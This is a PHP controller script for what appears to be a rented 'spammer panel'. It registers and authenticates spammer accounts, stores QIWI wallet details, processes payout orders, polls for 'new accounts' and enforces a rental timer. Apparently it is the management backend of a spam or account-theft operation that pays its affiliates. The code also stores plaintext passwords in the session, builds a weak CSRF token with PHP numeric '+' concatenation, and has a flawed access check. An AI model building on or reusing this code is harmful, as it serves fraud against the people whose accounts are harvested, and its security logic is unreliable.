<?php
	require_once("../php/classPanel.php");
	require_once("../php/classSpammerPanelPageGenerator.php");
	
	
	
	session_start();
	
	
	$url_array = parse_url($_SERVER['REQUEST_URI']);
	$path = $url_array["path"];
	if ($path[strlen($path)-1] == "/") $path = substr($path, 0, -1); 
	
	
	$Panel = new classPanel();
	
	
	if (
	
		(($path !== "/spanel/auth") && ($path !== "/spanel/reg") )
		
			&& 
			
		(!isset($_POST["auth"]) && !isset($_POST["reg"]))
		
			&&
		
		(
			!isset($_SESSION["spammer_login"]) 
				&& 
			!isset($_SESSION["spammer_password"])
		) 
		
			&& 
		
		!$Panel->b_CheckSpammerAcc(
			$_SESSION["spammer_login"], 
			$_SESSION["spammer_password"]
		)
		
	) {
		header("Location: /spanel/auth");
		exit();
	}
	
	
	
	if(!empty($_POST))
	{
		
		if (isset($_POST["auth"])) 
		{
			if ($Panel->b_CheckOnValidSpammerAcc($_POST["email"], $_POST["password"])) {
				$_SESSION["spammer_login"] = $_POST["email"];
				$_SESSION["spammer_password"] = $_POST["password"];
				$_SESSION["csrf_token"] = md5("skdufbls" + rand());
				header("Location: /spanel");
			}
			else header("Location: /spanel/auth");
			
			exit();
		}
		
		if (isset($_POST["reg"])) 
		{
			if ($_POST["login"] != "" && $_POST["password"] != "") {
				if (!$Panel->b_CheckSpammerAcc($_POST["login"])) {
					$Panel->void_AddSpammer($_POST["login"], $_POST["password"]);
					$Panel->void_UpdateSpammer($_POST["login"], null, $_POST["qiwi"], null);
					header("Location: /spanel/auth");
					exit();
				}
				else $_ERROR = 1;
			}
		}
		
		if (isset($_POST["settings"]) && $_POST["csrf_token"] == $_SESSION["csrf_token"]) {
			$Panel->void_UpdateSpammer($_POST["login"], $_POST["password"], $_POST["qiwi"], null);
		}
		
		if ($_POST["do"] == "Order" && $_POST["csrf_token"] == $_SESSION["csrf_token"]) {
			$Panel->void_OrderPayout($_SESSION["spammer_login"]);
		}
	}
	
	
	
	$id = "";
	$part = false;
	
	
	
	if (!empty($_GET))
	{
		
		if (array_key_exists("do", $_GET)) 
		{
			if ($_GET["do"] == "Notify") 
			{
				if ($Panel->b_newAccs()) echo "1";
				$Panel->void_setNotificated();
				exit();
			}
			
			if ($_GET["do"] == "GetPart") {
				$id = $_GET["id"];
				$part = true;
			}
		}
		
	}
	
	
	$PanelPageGen = new PageGenerator("template", $part, $id);
	
	if ($Panel->int_GetTimerActivity() > 0) {
		if ($Panel->int_GetTimerTime() <= time()) {
			echo $PanelPageGen->GenerateRentIsOver();
			exit();
		} 
	}
	
	
	
	
	switch ($path){
		case "/spanel/reg": 
			if ($Panel->b_CheckSpammerAcc($_SESSION["spammer_login"], $_SESSION["spammer_password"])) {
				header("Location: /spanel");
				exit();
			};
			echo $PanelPageGen->GenerateReg();
		break;
		
		case "/spanel/auth": 
			if ($Panel->b_CheckSpammerAcc($_SESSION["spammer_login"], $_SESSION["spammer_password"])) {
				header("Location: /spanel");
				exit();
			};
			echo $PanelPageGen->GenerateAuth();
		break;
		
		case "/spanel/logout": 
			unset($_SESSION["spammer_login"]);
			unset($_SESSION["spammer_password"]);
			header("Location: /spanel/auth");
			exit();
		break;
		
		case "/spanel": 
			echo $PanelPageGen->GenerateIndex();
		break;
		
		case "/spanel/settings": 
			echo $PanelPageGen->GenerateSettings();
		break;
	}
?>